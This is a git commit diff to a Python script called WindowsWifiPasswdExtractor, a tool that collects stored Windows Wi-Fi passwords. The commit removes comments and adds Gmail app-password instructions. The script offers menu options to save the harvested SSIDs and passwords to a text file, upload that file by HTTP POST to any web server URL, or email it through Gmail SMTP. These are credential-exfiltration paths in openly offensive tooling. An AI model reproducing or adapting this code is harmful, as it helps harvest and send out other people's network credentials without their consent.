90e22bf3d7592df5d7e57dbc9fd30f4d7cc78dab
Robinhood <ansarithameem674@gmail.com>
2022-10-12 23:01:07 +0530

    updates

--- WindowsWifiPasswdExtractor.py
+++ WindowsWifiPasswdExtractor.py
@@ -9,19 +9,28 @@ import os
 import requests, getpass
 import smtplib, ssl
 
-def KeyboardInterruptError():  #When Keyboard Interupts,this function is been called
+def KeyboardInterruptError():  
     os.system('cls')
     if os.path.exists('WifiPasswd.txt'):
         os.remove('WifiPasswd.txt')
     print("\033[31m\nExiting \n\033[00m")
-def error(): # If any Error occurs in the Program this function is been called
+def error(): 
     os.system('cls')
     print("\033[31m\nSomething went wrong.Try again with proper information\033[00m")
     os.remove('WifiPasswd.txt')
-def email(): # Function for Sending Email 
+def email():  
     port = 465  # For SSL
     smtp_server = "smtp.gmail.com"
-    sender_email =input("\033[31mMake sure to turn on the less secure app settings in Google \n\n\033[00mType Sender gmail: ")
+    os.system('cls')
+    print("\033[31mAttention !!\033[00m")
+    Docs ='''
+> To send mail through gmail follow the instruction
+> First go to your Google Account and enable the 2-Step Verification.
+> After that at the bottom, choose Select app and create a app.
+> Follow the instructions, then you will be prompted with the App Password,the 16-character code.
+> Copy it now use this as password here !!.'''
+    print(Docs)
+    sender_email =input("\033[31m\nRefer this for more info https://bit.ly/3Vpmuvp \n\n\033[00mType Sender gmail: ")
     password = getpass.getpass('Enter the Password :')  
     context = ssl.create_default_context()
     with open('WifiPasswd.txt', 'r') as file:
@@ -40,18 +49,19 @@ def email(): # Function for Sending Email
         email()
     except:
         error()
-def showit(): #Prints the Stored Password
+        
+def showit(): 
     if not password:
         print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\033[0m")
     else:
         print("\033[92mSSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\033[0m".format(password[0]))
-def savetxt(): #Saves the Stored Password in WifiPasswd.txt
+def savetxt(): 
     with open("WifiPasswd.txt", 'a') as f:
         if not password:
             f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":None\n\n")
         else:
             f.write("SSID" + " " * 7 + ":{}\nPassword".format(x) + " " * 3 + ":{}\n\n".format(password[0]))
-def PostWebserver(): #Function to Sending the passwrd over PHP Server
+def PostWebserver(): 
     url = input("Enter the url(Eg:http://example.com/upload.php): ")
     if url=='':
         os.system('cls')
@@ -62,7 +72,7 @@ def PostWebserver(): #Function to Sending the passwrd over PHP Server
         r = requests.post(url, files={'uploaded_file': (f)})
         if r.status_code == 200:
             print("\033[92mUploaded Successfully\033[0m")
-def main(): #Main Function
+def main(): 
     global password,x
     try:
         Ask = input("Choose the Options:\n   1.Show\n   2.SaveTxt\n   3.Post To Webserver\n   4.Send Mail\n   5.Exit\n>> ")
@@ -106,7 +116,7 @@ def main(): #Main Function
 
     except KeyboardInterrupt:
         KeyboardInterruptError()
-def banner (): #Banner
+def banner ():
     print(""" \033[31m
 
 888       888 888       888 8888888b.  8888888888 
@@ -125,6 +135,6 @@ def banner (): #Banner
 \033[00m""")
 
 
-os.system("cls") #Clears the Screen 
-banner() #Banner is been called
-main() #Main function is called
+os.system("cls") 
+banner()
+main()
